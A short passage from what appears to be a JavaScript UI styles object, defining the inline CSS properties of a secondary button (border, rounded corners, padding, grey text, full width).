  secondaryBtn: { background: 'none', border: '1.5px solid #ece8e0', borderRadius: '12px', padding: '13px 32px', color: '#8c96a6', cursor: 'pointer', fontSize: '14px', width: '100%', fontFamily: 'inherit' },
};
